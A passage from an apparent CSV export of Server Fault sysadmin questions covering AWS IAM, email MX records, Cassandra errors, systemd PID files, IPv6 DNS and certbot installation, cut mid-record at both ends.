","<ubuntu-16.04><apache2><lets-encrypt><digital-ocean>","2018-01-20 18:22:46"
"893428","Amazon web service visibility restriction to instances under same account","<p>I'm looking for a possible idea to restrict the visibility ec2 instances to certain IAM users under the same root account.</p>

<p>custom policies doesn't seem to work because describeInstances doesn't support resource-level permissions.</p>

<p>Is there any way to hide instances created by different IAM users from one another. Is this currently possible?</p>
","<amazon-ec2><amazon-web-services><access-control-list><multiple-instances><restrictions>","2018-01-22 07:26:04"
"893498","user's Internet Access logs in Network","<p>I  working on freeradius management system .
user can access internet after  insert his username and password .
after user can access internet he will surf internet .
every things go fine but my problem is ,
I want to register all users  access websites while  he used my wifi  .I searched for days  about this without result . freeradius can not register users activities .
is there any way to access my goal.</p>
","<ubuntu><freeradius>","2018-01-22 13:37:25"
"893555","Difference between SSL VPN tunneling and SSL in HTTPS","<p>I'm a beginner, and this is probably an elementary question, but I can't figure it out through some googling.</p>

<p>I'm learning about VPN tunneling right now, and am generally not clear on how VPN tunneling is different than any other encryption, but particularly I am not sure why HTTPS web browsing, which is already using SSL for encryption, would be more secure if it was routed through a VPN using SSL to secure the connection.</p>

<p>What is the added security of a VPN when the communication is already encrypted?</p>
","<ssl><vpn><encryption>","2018-01-22 20:10:03"
"894004","Replace Cat5e with Fiber?","<p>I have (2) LGS326P switches linked by one cat5e cable.  I am considering replacing that cable with MM fiber but want to be sure it is worth the upgrade.  Here is my setup in more detail....</p>

<p><strong>House:</strong>
(1) LGS326P switch 90% maxed </p>

<p><strong>Garage</strong>
(1) LGS326P switch 75% maxed</p>

<p>The run between the house and garage is roughly 270+/- linear feet.  My concern is in the garage I am running (10) IP Cameras, (1) laptop, (2) Game Consoles, (1) DTV receiver, a few WiFi devices, and a few other misc items.  All this data has only one cat5e cable cable linking it to the house router and switch.  Would I benefit from replacing that cat5e cable with a run of MM fiber even though the switches only support SFP and not SFP+ ?</p>

<p>Thanks,
Jimmie</p>
","<switch><fiber><cat5e>","2018-01-25 03:53:10"
"894020","Can i Set Two Different server MX Record for one Domain","<p>Suddently, Today one of my client asked me to setup google mail services for his business, currently he is using zoho mail and approx 5-6 user email working on zoho, now he purchased google mail services for 1 user and want to host only 1 email account from his zoho mail to google mail and for rest 5 users account he wants to be continue on zoho it self..</p>

<p>is there any possibilities to host both mx records of zoho and gmail for single domain. </p>

<p>any suggestion , it will be thankful. </p>
","<email><email-server><mx-record><gmail>","2018-01-25 07:14:17"
"894028","Can you store an android application in google cloud?","<p>i am new to cloud platform services. I have developed a simple android application that has AR element to it. Is it possible to store the app here, and download the app to my phone whenerver i want or is there certain steps that i have to follow? If not, may i know any alternatives to store an app in cloud? </p>
","<google-cloud-platform>","2018-01-25 08:15:21"
"894500","program 'go' is currently not installed on ubuntu 16.04","<p>I ran a <code>sudo apt-get install golang-1.9</code> from my regular user account on my ubuntu 16.04 and it said everything installed correctly.  So then I typed <code>go version</code> and verified I had the right version.  Then I shut down my computer. Then I turned on my computer.  I logged in with my regular user again.  Then I typed <code>go version</code> and I get the message:</p>

<blockquote>
  <p>The program 'go' is currently not installed. You can install it by
  typing: sudo apt install golang-go</p>
</blockquote>

<p>I don't want to run the <code>sudo apt install golang-go</code> because it installs the older 1.6 version.</p>

<p>When I try to do a <code>sudo apt-get install golang1.9</code>, the terminal says it's already installed.  So if it's alreayd installed, then why do I get a ""go is currently not installed"" message?</p>

<p>How do I get the go command to work?</p>
","<go>","2018-01-28 15:43:31"
"894541","Change/add text to current user@server","<p>Its kinda hard to pick a good title, sorry for that!</p>

<p>When you login to Linux, you see the user and the domain where you can type your commands. </p>

<p><code>[user@location domain.nl]$ mv ~/example ~/my-new-example</code>. </p>

<p>I have 2 servers which almost are identical. Can i change the user@location text or add something to it like </p>

<p><code>[my-own-text-here]$ mv ~/example ~/my-new-example</code></p>
","<linux><terminal>","2018-01-29 03:20:10"
"894589","How to find second ssl certificate for domain","<p>This is a little hard to get across, so apologies if it's unclear.</p>

<p>I have been asked by a client to install an ssl cert on a domain that lives on a server he looks after. There are multiple domains pointing to the same server. Someone before me has used certbot to install a cert for one domain: <code>elitemi.co.uk</code>. I used certbot to create a certificate for another domain <code>print4.co.uk</code>. On running a test <code>https://www.ssllabs.com/ssltest/analyze.html?d=print4.co.uk</code> the first cert is valid, but there is a secondary cert with the common name of <code>elitemi.co.uk</code>. </p>

<p>This is causing issues with outlook and other services, and I just want rid of it! I have checked the config for print4.co.uk and it doesn't have an entry for the other cert, and as far as I can see there are no defaults set for nginx or nginx.conf to point to the elitemi cert. I'm out of ideas and the guy who set the first one up can't remember what he did.</p>

<p>So my question is how to find out why the second cert is even being looked at and how to get rid of this connection.</p>
","<nginx><ubuntu-14.04><lets-encrypt><certbot>","2018-01-29 11:18:11"
"894687","Error When Starting Cassandra for First Time","<p>I'm trying to get a single-node cluster of Cassandra set up on my VPS for a school project.  So I installed cassandra on Ubuntu 16.04 (JVM 1.8.0_161), but when I run, I encounter this error... <a href=""https://pastebin.com/raw/h1vWhm2e"" rel=""nofollow noreferrer"">https://pastebin.com/raw/h1vWhm2e</a></p>

<p>(Posted as link to provide full output).</p>

<p>I was just running it through the <code>cassandra</code> command.</p>

<p>Relevant bit:</p>

<pre><code>    Exception (java.lang.AbstractMethodError) encountered during startup: org.apache.cassandra.utils.JMXServerUtils$Exporter.exportObject(Ljava/rmi/Remote;ILjava/rmi/server/RMIClientSocketFactory;Ljava/rmi/server/RMIServerSocketFactory;Lsun/misc/ObjectInputFilter;)Ljava/rmi/Remote;
java.lang.AbstractMethodError: org.apache.cassandra.utils.JMXServerUtils$Exporter.exportObject(Ljava/rmi/Remote;ILjava/rmi/server/RMIClientSocketFactory;Ljava/rmi/server/RMIServerSocketFactory;Lsun/misc/ObjectInputFilter;)Ljava/rmi/Remote;
    at javax.management.remote.rmi.RMIJRMPServerImpl.export(RMIJRMPServerImpl.java:150)
    at javax.management.remote.rmi.RMIJRMPServerImpl.export(RMIJRMPServerImpl.java:135)
    at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:405)
    at org.apache.cassandra.utils.JMXServerUtils.createJMXServer(JMXServerUtils.java:104)
    at org.apache.cassandra.service.CassandraDaemon.maybeInitJmx(CassandraDaemon.java:143)
    at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:188)
    at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:600)
    at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:689)
ERROR [main] 2018-01-29 21:59:17,370 CassandraDaemon.java:706 - Exception encountered during startup
java.lang.AbstractMethodError: org.apache.cassandra.utils.JMXServerUtils$Exporter.exportObject(Ljava/rmi/Remote;ILjava/rmi/server/RMIClientSocketFactory;Ljava/rmi/server/RMIServerSocketFactory;Lsun/misc/ObjectInputFilter;)Ljava/rmi/Remote;
    at javax.management.remote.rmi.RMIJRMPServerImpl.export(RMIJRMPServerImpl.java:150) ~[na:1.8.0_161]
    at javax.management.remote.rmi.RMIJRMPServerImpl.export(RMIJRMPServerImpl.java:135) ~[na:1.8.0_161]
    at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:405) ~[na:1.8.0_161]
    at org.apache.cassandra.utils.JMXServerUtils.createJMXServer(JMXServerUtils.java:104) ~[apache-cassandra-3.11.1.jar:3.11.1]
    at org.apache.cassandra.service.CassandraDaemon.maybeInitJmx(CassandraDaemon.java:143) [apache-cassandra-3.11.1.jar:3.11.1]
    at org.apache.cassandra.service.CassandraDaemon.setup(CassandraDaemon.java:188) [apache-cassandra-3.11.1.jar:3.11.1]
    at org.apache.cassandra.service.CassandraDaemon.activate(CassandraDaemon.java:600) [apache-cassandra-3.11.1.jar:3.11.1]
    at org.apache.cassandra.service.CassandraDaemon.main(CassandraDaemon.java:689) [apache-cassandra-3.11.1.jar:3.11.1]
</code></pre>
","<ubuntu><database><cluster><cassandra>","2018-01-29 22:07:49"
"894690","Inbound & outbound emails marked as phishing","<p>We look after multiple Office 365 tenants for hosted Exchange email.</p>

<p>One tenant in particular has an issue where a lot of inbound and outbound emails are marked as phishing.</p>

<p><a href=""https://i.sstatic.net/tLG3C.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/tLG3C.png"" alt=""This message was identified as a phishing scam""></a></p>

<p>The domain passes all DNS checks under the Admin console, and I can't find the domain on any blacklist checks.</p>

<p>SPF: v=spf1 include:spf.protection.outlook.com -all</p>

<p>I investigated enabling DKIM, however unfortunately the domain registrar does not accept underscores in CNAME records.</p>

<p>Can someone please help? The issue is very frustrating for our client.</p>

<p>Thanks!</p>
","<microsoft-office-365><exchangeonline><phishing>","2018-01-29 22:22:28"
"894719","Is there a way to find what processes are in nice CPU top list?","<p>I have a top output that shows a high amount in <code>nic</code> CPU percentage.
<a href=""https://i.sstatic.net/Vumly.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Vumly.png"" alt=""top output""></a></p>

<p>Is there a way to see what those processes are? And is it possible to do it from top?</p>
","<unix><top><android>","2018-01-30 04:46:57"
"894736","How to set up a FreeIPA server on Arch Linux?","<p>I am looking for instructions to set up a <a href=""https://www.freeipa.org/page/Main_Page"" rel=""nofollow noreferrer"">FreeIPA</a> server on Arch Linux. Unfortunately, I am only seeing tutorials for setting up a FreeIPA server on RedHat or its derived distributions. (And I'm only seeing instructions for Arch Linux for a FreeIPA client.)</p>

<p>Is it possible to set up a FreeIPA server on Arch Linux? If so, what are the steps?</p>
","<linux><ldap><kerberos><arch-linux><freeipa>","2018-01-30 07:30:22"
"823986","Make rented Server appear inside local network","<p>My question is if it is possible to make a rented (external) server appear inside my local network, so that the server can comunicate with all my local devices.</p>

<p>I'm currently running a raspberry Pi inside my local network as a HomeKit Bridge and because I have running a webserver on digital ocean I thougt it would be very interesting making that digital ocean server available inside my local network and run the Homekit Bridge on it, but i didn't came up with a solution. Maybe sb. has an answer to my question!?</p>
","<linux><networking>","2017-01-04 00:13:35"
"894789","Why am I still getting spam email and what more can I do to stop it?","<p>I've set up SpamAssassin on my server</p>

<p>I've configured my dmarc, DKIM and spf records in my domain's DNS which wasn't easy to figure out how to do correctly but for a while after I'd done this the spam stopped but now its back again.</p>

<p>Here's my dmarc, DKIM and SPF records all as TXT records on the DNS (I changed actual values so these don't reflect <em>actual</em> data on my domain).</p>

<p>dmarc:</p>

<blockquote>
  <p>v=DMARC1; p=quarantine; rua=mailto:<em>email</em>; ruf=mailto:<em>email</em>; aspf=r; adkim=r</p>
</blockquote>

<p>DKIM:</p>

<blockquote>
  <p>v=DKIM1; k=skh; p=MIIBIkug876GKgut785ukutioogiyry47gmhMHFyrJKkmsOyyK+J</p>
</blockquote>

<p>spf:</p>

<blockquote>
  <p>v=spf1 +a +mx +ip4:<em>mail server ip</em> -all</p>
</blockquote>

<p>What more can I do to stop the spam?</p>
","<email><email-server>","2018-01-30 13:57:52"
"894838","Is there a *NIX shell that has most all tools built-in - not symlinked, no external execs?","<p>I am looking for a *NIX shell where most of the basic functionality - ls, cat, etc. - is done internally and not called via exec to outside programs. busybox does something with symlinked binary names calling back to itself, but it still calls exec instead of just calling the programs internally. Is there a fully self-contained shell like this somewhere? I can't seem to Google up anything.</p>

<p>Thank you in advance!</p>
","<linux><shell>","2018-01-30 18:03:46"
"894925","How do I get rid of possibly rogue process in Linux?","<p>So lately, every time I start up my Linux server, all two CPUs are 100% utilised, and when I check the processes running, I see a process called ""S01wipefs"" taking up all my CPU.</p>

<p><a href=""https://i.sstatic.net/me9us.png"" rel=""nofollow noreferrer"">CPU utilisation</a></p>

<p>When I type ""which S01wipefs"", I get: <code>/usr/bin/which: no S01wipefs in (/usr/lib64/qt-3.3/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin)</code> Essentially, nothing.</p>

<p>Please, how do I resolve this?</p>
","<linux><redhat>","2018-01-31 08:47:44"
"894937","Best way of configuring multiple spanning volumes","<p>Perhaps this has been asked before, but if it is, it is buried deep.</p>

<p>I am looking on the best way configuring a spanning and extending volumes to mulitple disk on server. I have heard about RAID 5, and some people say that RAID 5 is a risky way to protect data, but then some say that RAID 6 is useless. I plan on RAID 10, but I still not sure about the ""0"" things. Then there is a plain spanned volume, that I can do with mirroring. </p>

<p>I am asking for advise, on how the best way to protect data without sacrificing much? The recoverability and extendability is a must. I have multiple machines running near realtime mirror on this volume in remote location, but I want a reliable, but fast and cheap solution to recover when something happens to this server without depending on off-site backup. My goal is to minimize disruption in case of hard drive failure. I also need to extend the volume when I install new hard drive. </p>

<p>So... which route should I take best for my approach? Span-Mirror, RAID 10, RAID 5, RAID 6 or is there any other option? What are advantages and disadvantages of each method? </p>

<p>The files being stored are mostly pictures, spreadsheets, documents, presentations, and such. Not big files. Small, and numerous. </p>

<p>Thank you</p>
","<windows><raid>","2018-01-31 09:30:24"
"824231","How to make Samba4 Internal DNS resolve names without domain","<p>I have a Samba4 AD-DC configured with internal DNS. I followed the configuration at <a href=""https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller"" rel=""nofollow noreferrer"">https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller</a>
   I use this samba as my DNS for the network, but I find that it does not resolve names that don't have the domain suffix.
Example:</p>

<pre><code># dig tarl.domain.example.com
...

;; QUESTION SECTION:
;tarl.domain.example.com.         IN      A

;; ANSWER SECTION:
tarl.domain.example.com.  900     IN      A       10.0.0.2
...
</code></pre>

<p>But, if I query without domain:</p>

<pre><code># dig tarl
...
;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;tarl.                          IN      A
...
</code></pre>

<p>I have read and searched but could not find how to make Samba DNS resolve without domains. All I found was configuring DHCP to send a list of domains to try for these cases, but I prefer samba to handle this.</p>

<p>Thanks in Advance!
Regards.</p>
","<domain-name-system><active-directory><samba>","2017-01-04 21:35:55"
"824260","$server_name not matching domain when multiple subdomains listed in nginx","<p>I have the following server block defined:</p>

<pre><code>server {
  server_name jsonip.com www.jsonip.com ipv4.jsonip.com ipv6.jsonip.com;
  add_header x-domain-name ""$server_name $http_host $host"" always;
}
</code></pre>

<p>I'm setting the 'x-domain-name' header simply as a way to test what nginx is seeing and reflecting it back to the browser.</p>

<p>The issue I'm having is that if I access <a href=""https://ipv4.jsonip.com"" rel=""nofollow noreferrer"">https://ipv4.jsonip.com</a>, then $server_name is matching 'jsonip.com' rather than 'ipv4.jsonip.com'.</p>

<p>Conversely, both $http_host and $host are matching the domains correctly.</p>

<p>Is there a different way to configure the server_name domains in the server block to get $server_name to match correctly?</p>
","<nginx>","2017-01-05 00:40:02"
"824275","Best way: Sharing large data across LAN","<p>Problem: Small movie business using external USB hard drives to share large data between co-workers. </p>

<p>Problem 2: Remote access (They would also like remote access) (I can do this with a Mikrotik if I went with NAS, or the application server if not)</p>

<p>Solution: Some sort of Diskless NAS that allows for regular 7200rpm drives? An application server with capable SATA ports for adding HDDs?</p>

<p>Background: I have a small business client who creates movies, TV shows, etc.. They are building a new office and are wanting to do things better this time. They have requested a solution to better share large data between all of the coworkers. My question is, which to go with? File server or NAS. Typically, I would go with file server, but I figured I'd get some input from y'all.</p>

<p>If I went with a server, I would go with the following: <a href=""http://rads.stackoverflow.com/amzn/click/B011ZB45LM"" rel=""nofollow noreferrer"">https://www.amazon.com/Dell-PowerEdge-T20-Mini-tower-Server/dp/B011ZB45LM/ref=sr_1_2?ie=UTF8&amp;qid=1483584514&amp;sr=8-2&amp;keywords=dell+poweredge+t20</a></p>

<p>I would probably use a small SSD with Linux smb file server as the OS and use SATA cables to connect their already existing HDDs that they need shared. Note, they are all using MACs. </p>

<p>I don't have any experiences with NAS servers at all. Any suggestions would be great.</p>
","<linux><networking><network-share><network-attached-storage><file-sharing>","2017-01-05 02:59:57"
"824283","want to build a private 10 Gbps backplane","<p>I intend to purchase, two servers each containing a Intel 82599 QSFP+ that the vendor says has ""supports dual 10Gbe output via a splitter cable"".</p>

<p>Now I wanted to ideally connect the two servers and an additional desktop machine (that contains a card with 82599ES) into a private high speed data transfer backplane without a router.</p>

<p>Can someone guide me what kind of OM3 cable should be purchased to connect this port to two different machines ? The usual splitter cables seem to be splitting a 40Gbps to 4 x 10 GBps.</p>

<p>Alternatively, is there a device that physically converts the port into two ports - equivalent to a splitter -?</p>

<p>Thanks for all the advice.</p>
","<10gbethernet>","2017-01-05 04:34:21"
"895096","Delete files with odd file names","<p>I have these two files in my home directory that I am unable to delete:-</p>

<pre><code>-rw-rw-r-- 1 steve steve       20551 Jan 27 23:51 \home\steve?esult_picture.png
-rw-rw-r-- 1 steve steve       22238 Jan 27 23:54 \home\steve?esult.png
</code></pre>

<p>The error messages are:-</p>

<pre><code>rm: cannot remove 'homesteve?esult_picture.png': No such file or directory
rm: cannot remove 'homesteve?esult.png': No such file or directory
</code></pre>

<p>chmod gives a very similar error</p>

<pre><code>touch '\home\steve?esult_picture.png'
sudo rm -f '\home\steve?esult_picture.png'

touch '\home\steve?esult.png'
sudo rm -f '\home\steve?esult.png'
</code></pre>

<p>does not remove them either.</p>

<p>I'm fairly sure they were created in error using a python script.</p>

<p>Using Windows Explorer to view the smb share they are called _1UPF8~X.PNG and _UYBX6~Q.PNG and are viewable as pictures as one would expect. I can't do anything else with them though due to lack of appropriate permissions.</p>

<p>Any idea how I can remove them?</p>

<p>Steve</p>
","<permissions><rm>","2018-02-01 01:18:36"
"895163","This domain has no IPv6 DNS server, this may prevent some IPv6-only users from reaching it","<p>Apple rejected app update, because it doesn't work with ipv6 connection.
App connects to server over websocket (socket.io, NodeJS, Express). App uses subdomain address to connect to server.</p>

<p>I've set up a Google Load Balancer with two ""frontends"". One is regular ipv4, another one is ipv6.</p>

<p>I can reach server using load balancer's ipv4 address directly, so i assume this means i've done it correctly.</p>

<p>Load balancer's external reserved ipv6 address looks like that:</p>

<p><code>[9999:9999:0:9999::]:80</code></p>

<p>I've added ""AAAA"" DNS record to subdomain. After accepting this address, DNS editor shows it like that:</p>

<p><code>9999:9999:0000:9999:0000:0000:0000:0000</code></p>

<p>Services like this one: <a href=""http://ipv6-test.com/validate.php"" rel=""nofollow noreferrer"">http://ipv6-test.com/validate.php</a><br>
Are showing these results: <a href=""http://prntscr.com/i8fk9j"" rel=""nofollow noreferrer"">http://prntscr.com/i8fk9j</a></p>

<p>As you can see on the screenshot, among other messages it says this:</p>

<blockquote>
  <p>This domain has no IPv6 DNS server, this may prevent some IPv6-only users from reaching it.</p>
</blockquote>

<p>I've created hotspot as described <a href=""https://developer.apple.com/library/content/documentation/NetworkingInternetWeb/Conceptual/NetworkingOverview/UnderstandingandPreparingfortheIPv6Transition/UnderstandingandPreparingfortheIPv6Transition.html#//apple_ref/doc/uid/TP40010220-CH213-SW1"" rel=""nofollow noreferrer"">here by apple</a> (Test for IPv6 DNS64/NAT64 Compatibility Regularly) and connected iphone to this hotspot.<br>
App can't connect to server.<br>
I've also tried to reach healthcheck in Safari address while on the same phone with the same connection. It returns correct response ""true"", but this has nothing to do with websocket - it's simple REST listener.</p>

<p>What am i doing wrong?</p>
","<networking><ipv6><node.js><apple>","2018-02-01 12:01:05"
"824543","Trouble creating PID file in systemd service script","<p>I'm trying to get RipRight installed on Debian, for which there doesn't appear to be any pre-built package. I'm having difficulty getting a systemd script working to start/stop RipRight running as a daemon because it can't write the PID file to <code>/run</code>.</p>

<p>I went through the usual configure/make/make install. I also created a <code>ripright</code> user/group and added <code>ripright</code> to the <code>cdrom</code> group.</p>

<p>Here is the systemd script I placed in <code>/etc/systemd/system/ripright.service</code>:</p>

<pre><code>[Unit]
Description=RipRight

[Service]
Type=forking
PrivateTmp=yes
User=ripright
Group=ripright

RuntimeDirectory=ripright
RuntimeDirectoryMode=0750

ExecStart=/usr/local/bin/ripright \
    --daemon \
    --w32-filenames \
    --require-art \
    --folder-art folder.png \
    --output-file ""%B/%D/%C - %N %T.flac"" \
    ""/opt/ripright/data""
PIDFile=/var/run/ripright/ripright.pid

[Install]
WantedBy=multi-user.target
</code></pre>

<p>I used the recently-added <code>RuntimeDirectory</code> directive in the script to create a <code>/run/ripright</code> folder with <code>ripright</code> as the owner. This directory gets created when I run:</p>

<pre><code># systemctl daemon-reload
# systemctl start ripright
</code></pre>

<p>In a separate window:</p>

<pre><code># ls -lhrt /run
...
drwxr-x---  2 ripright ripright   40 Jan  5 20:52 ripright
drwxr-xr-x 16 root     root      400 Jan  5 20:52 systemd
# ls -lahrt /run/ripright
total 0
drwxr-xr-x 16 root     root     540 Jan  5 20:52 ..
drwxr-x---  2 ripright ripright  40 Jan  5 20:52 .
# su - ripright
$ cd /run/ripright
$ pwd
/run/ripright
$ echo test &gt; one.txt
$ cat one.txt
test
$ rm one.txt
$ exit
</code></pre>

<p>I believe my <code>systemctl start</code> command does not return due to this and instead hangs. After a minute or so, it times out with:</p>

<pre><code># systemctl start ripright
Job for ripright.service failed. See 'systemctl status ripright.service' and 'journalctl -xn' for details.
</code></pre>

<p>Here is the output of the recommended commands:</p>

<pre><code># systemctl status ripright.service
● ripright.service - RipRight
   Loaded: loaded (/etc/systemd/system/ripright.service; enabled)
   Active: failed (Result: timeout) since Thu 2017-01-05 20:54:40 EST; 55s ago
  Process: 35396 ExecStart=/usr/local/bin/ripright --daemon --w32-filenames --require-art --folder-art folder.png --output-file %B/%D/%C - %N %T.flac /opt/ripright/data (code=exited, status=0/SUCCESS)
 Main PID: 33287 (code=killed, signal=TERM)

Jan 05 20:53:10 ripperd ripright[35397]: Started daemon mode (v0.11)
Jan 05 20:53:10 ripperd ripright[35398]: Waiting for a CD (/dev/cdrom)
Jan 05 20:54:40 ripperd systemd[1]: ripright.service start operation timed out. Terminating.
Jan 05 20:54:40 ripperd systemd[1]: Failed to start RipRight.
Jan 05 20:54:40 ripperd systemd[1]: Unit ripright.service entered failed state.

# journalctl -xn
-- Logs begin at Thu 2017-01-05 00:30:29 EST, end at Thu 2017-01-05 20:54:40 EST. --
Jan 05 20:52:00 ripperd ripright[35380]: Waiting for a CD (/dev/cdrom)
Jan 05 20:52:59 ripperd su[35385]: Successful su for ripright by root
Jan 05 20:52:59 ripperd su[35385]: + /dev/pts/1 root:ripright
Jan 05 20:52:59 ripperd su[35385]: pam_unix(su:session): session opened for user ripright by vagrant(uid=0)
Jan 05 20:53:10 ripperd ripright[35397]: Started daemon mode (v0.11)
Jan 05 20:53:10 ripperd ripright[35398]: Waiting for a CD (/dev/cdrom)
Jan 05 20:53:33 ripperd su[35385]: pam_unix(su:session): session closed for user ripright
Jan 05 20:54:40 ripperd systemd[1]: ripright.service start operation timed out. Terminating.
Jan 05 20:54:40 ripperd systemd[1]: Failed to start RipRight.
-- Subject: Unit ripright.service has failed
-- Defined-By: systemd
-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel
-- 
-- Unit ripright.service has failed.
-- 
-- The result is failed.
Jan 05 20:54:40 ripperd systemd[1]: Unit ripright.service entered failed state.
</code></pre>

<p>If I comment out the PIDFile directive in the systemd service script:</p>

<pre><code>#PIDFile=/var/run/ripright/ripright.pid
</code></pre>

<p>Then I have no problems, but also no PID file as recommended for a service type of forking:</p>

<pre><code># systemctl daemon-reload
# systemctl start ripright
# ps -ef | grep ripright
ripright  35438      1  0 21:03 ?        00:00:00 /usr/local/bin/ripright --daemon --w32-filenames --require-art --folder-art folder.png --output-file %B/%D/%C - ripright %T.flac /opt/ripright/data
ripright  35439  35438  0 21:03 ?        00:00:00 /usr/local/bin/ripright --daemon --w32-filenames --require-art --folder-art folder.png --output-file %B/%D/%C - ripright %T.flac /opt/ripright/data
root      35442  31942  0 21:03 pts/0    00:00:00 grep ripright
root@ripperd:~# systemctl status ripright
● ripright.service - A minimal CD ripper for Linux modeled on autorip.
   Loaded: loaded (/etc/systemd/system/ripright.service; enabled)
   Active: active (running) since Thu 2017-01-05 21:03:11 EST; 13s ago
  Process: 35437 ExecStart=/usr/local/bin/ripright --daemon --w32-filenames --require-art --folder-art folder.png --output-file %B/%D/%C - %N %T.flac /opt/ripright/data (code=exited, status=0/SUCCESS)
 Main PID: 35438 (ripright)
   CGroup: /system.slice/ripright.service
           ├─35438 /usr/local/bin/ripright --daemon --w32-filenames --require...
           └─35439 /usr/local/bin/ripright --daemon --w32-filenames --require...

Jan 05 21:03:11 ripperd ripright[35438]: Started daemon mode (v0.11)
Jan 05 21:03:11 ripperd ripright[35439]: Waiting for a CD (/dev/cdrom)
# ls -la /run/ripright
total 0
drwxr-x---  2 ripright ripright  40 Jan  5 21:04 .
drwxr-xr-x 16 root     root     540 Jan  5 21:04 ..
# systemctl stop ripright
</code></pre>

<p>Interestingly enough, when I brought <code>PIDFiles</code> back in and commented out <code>User</code> and <code>Group</code> to run ripright as root, daemon-reloading and then starting the script still hangs:</p>

<pre><code>#User=ripright
#Group=ripright
PIDFile=/var/run/ripright/ripright.pid
</code></pre>

<p>The same thing happens if I leave <code>User</code> and <code>Group</code> commented out and set <code>PIDFile</code> to produce the PID file directly in the /run directory (noting /var/run is simply a symlink to /run in Debian Jessie):</p>

<pre><code>#User=ripright
#Group=ripright
#PIDFile=/var/run/ripright/ripright.pid
PIDFile=/run/ripright.pid
</code></pre>

<p>Note in all cases I can press Ctrl+C during the hang and the ripright daemon will continue to run; however, if I let the start time out, it'll stop the daemon before printing the error and returning.</p>

<p>I also went through <a href=""https://blog.hqcodeshop.fi/archives/93-Handling-varrun-with-systemd.html"" rel=""nofollow noreferrer"">this post</a> and its comments. The initial approach of using <code>ExecStartPre</code> had the same results; I did not get far with using <code>tmpfiles.d</code> as I couldn't find any information on how to make the changes take effect without rebooting. I tried <code>mount -a</code> but that didn't seem to work.</p>
","<systemd><debian-jessie><systemctl>","2017-01-06 02:20:18"
"895301","Obtaining IP of device without accessing Router Interface","<p>I initially posted this question in StackOverflow but I feel it may be more appropriate here. </p>

<p>I have an Orange Pi Zero, which I have flashed Raspbian on. It does not have HDMI, so I need to connect to it via Putty (or a similar program). The problem is that I cannot obtain the device's IP address, which seems to be a requirement in order for me to connect to it through programs like Putty.</p>

<p>The standard procedure for obtaining the Orange Pi's IP seems to be to log in to the admin Interface of the router, and to pull it out from there--but I am unable to do that because I am using my school's networks--and our IT Department has never had to perform anything like this, so the project has been put on hold. They told me to try ""Angry IP Scanner"" but I could not find my device through that program--a user also told me to try <code>nmap</code> but again, no luck with that either.</p>

<p>Does anyone know of any other method to obtain the device IP? One in which I do not have to login to the router's admin interface.</p>

<p>A friend said it is possible to link the PC to the Orange Pi via Eternet cable and connect to it like that... I can't seem to find any information for doing so, does anyone know if this is even possible? </p>
","<ip>","2018-02-02 08:27:24"
"895327","Profiling start time for Ubuntu 14.04","<p>I want to know how much time is taken by Ubuntu 14.04 when we start it. So for this I have added the below line in <code>rc.local</code></p>

<pre><code>awk '{print int($1/3600)"":""int(($1%3600)/60)"":""($1%60)}' /proc/uptime &gt; /var/log/uptime.log
</code></pre>

<p>It is showing about 28 seconds. Can someone let me know how can I get more information about what steps are adding to this 28 seconds?</p>
","<linux><ubuntu-14.04><boot>","2018-02-02 10:40:12"
"824578","How do I create a SSL certificate with LetsEncrypt with CertBot? ""Could not install OS dependencies. Aborting bootstrap!""","<p>LetsEncrypt says to use CertBot. I'm following the instructions here</p>

<p><a href=""https://certbot.eff.org/#centos6-apache"" rel=""nofollow noreferrer"">https://certbot.eff.org/#centos6-apache</a></p>

<p>but it gives an error.</p>

<pre><code>[root@ip ~]# ./certbot-auto
Bootstrapping dependencies for RedHat-based OSes...
yum is /usr/bin/yum
Loaded plugins: fastestmirror, presto
Setting up Install Process
Loading mirror speeds from cached hostfile
 * base: mirror.spro.net
 * epel: s3-mirror-us-west-2.fedoraproject.org
 * extras: mirror.spro.net
 * rpmforge: mirror.chpc.utah.edu
 * updates: mirror.hmc.edu
Package gcc-4.4.7-17.el6.x86_64 already installed and latest version
Package augeas-libs-1.0.0-10.el6.x86_64 already installed and latest version
Package openssl-1.0.1e-48.el6_8.3.x86_64 already installed and latest version
Package openssl-devel-1.0.1e-48.el6_8.3.x86_64 already installed and latest version
Package ca-certificates-2015.2.6-65.0.1.el6_7.noarch already installed and latest version
Package python-2.6.6-66.el6_8.x86_64 already installed and latest version
Resolving Dependencies
--&gt; Running transaction check
---&gt; Package dialog.x86_64 0:1.1-9.20080819.1.el6 will be installed
---&gt; Package libffi-devel.x86_64 0:3.0.5-3.2.el6 will be installed
---&gt; Package mod_ssl.x86_64 1:2.2.15-55.el6.centos.2 will be installed
---&gt; Package python-devel.x86_64 0:2.6.6-66.el6_8 will be installed
---&gt; Package python-pip.noarch 0:7.1.0-1.el6 will be installed
--&gt; Processing Dependency: python-setuptools for package: python-pip-7.1.0-1.el6.noarch
---&gt; Package python-tools.x86_64 0:2.6.6-66.el6_8 will be installed
--&gt; Processing Dependency: tkinter = 2.6.6-66.el6_8 for package: python-tools-2.6.6-66.el6_8.x86_64
---&gt; Package python-virtualenv.noarch 0:1.10.1-1.el6 will be installed
---&gt; Package redhat-rpm-config.noarch 0:9.0.3-51.el6.centos will be installed
--&gt; Running transaction check
---&gt; Package python-setuptools.noarch 0:0.6.10-3.el6 will be installed
---&gt; Package tkinter.x86_64 0:2.6.6-66.el6_8 will be installed
--&gt; Processing Dependency: libtk8.5.so()(64bit) for package: tkinter-2.6.6-66.el6_8.x86_64
--&gt; Processing Dependency: libtcl8.5.so()(64bit) for package: tkinter-2.6.6-66.el6_8.x86_64
--&gt; Processing Dependency: libTix.so()(64bit) for package: tkinter-2.6.6-66.el6_8.x86_64
--&gt; Running transaction check
---&gt; Package tcl.x86_64 1:8.5.7-6.el6 will be installed
---&gt; Package tix.x86_64 1:8.4.3-5.el6 will be installed
